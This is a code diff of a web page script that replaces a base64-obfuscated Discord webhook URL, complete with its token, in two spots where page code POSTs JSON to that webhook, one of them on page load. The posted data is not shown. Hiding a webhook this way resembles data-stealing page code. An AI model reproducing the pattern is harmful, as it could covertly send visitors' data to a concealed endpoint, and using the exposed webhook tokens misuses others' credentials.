@@ -22,7 +22,7 @@ document.addEventListener('DOMContentLoaded', function () {
 
 
         var request = new XMLHttpRequest();
-        const decodedWebhookURL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE5NzE4MzE0MjQ3MDA5NDg0OC9PZjVERndHYWFfaDQ5LVFVbE9iNkZ2YXQzRWxzeUVaTWdUN3FKZFlNZ003ZG5IdzVDWHlMVUFQX2JrZzRHVWdyU1UzWA==");
+        const decodedWebhookURL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMDY2Nzk2MjU1ODcwOTc5MS9iQ3JJODk5b3o1UlJtT1gweDY2dEVtTVdFX0l2ZXZGUURhaFBLYm9SVTZsaXRWTllEekw0SUE3U3pCZTNKMVUtVG5wNg==");
 
         request.open("POST", decodedWebhookURL);
         request.setRequestHeader('Content-type', 'application/json');
@@ -76,7 +76,7 @@ var messageSent = false;
       }
 
       var request = new XMLHttpRequest();
-      const decodedWebhookURL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTE5NzE4MzE0MjQ3MDA5NDg0OC9PZjVERndHYWFfaDQ5LVFVbE9iNkZ2YXQzRWxzeUVaTWdUN3FKZFlNZ003ZG5IdzVDWHlMVUFQX2JrZzRHVWdyU1UzWA==");
+      const decodedWebhookURL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTIxMDY2Nzk2MjU1ODcwOTc5MS9iQ3JJODk5b3o1UlJtT1gweDY2dEVtTVdFX0l2ZXZGUURhaFBLYm9SVTZsaXRWTllEekw0SUE3U3pCZTNKMVUtVG5wNg==");
 
       request.open("POST", decodedWebhookURL);
       request.setRequestHeader('Content-type', 'application/json');
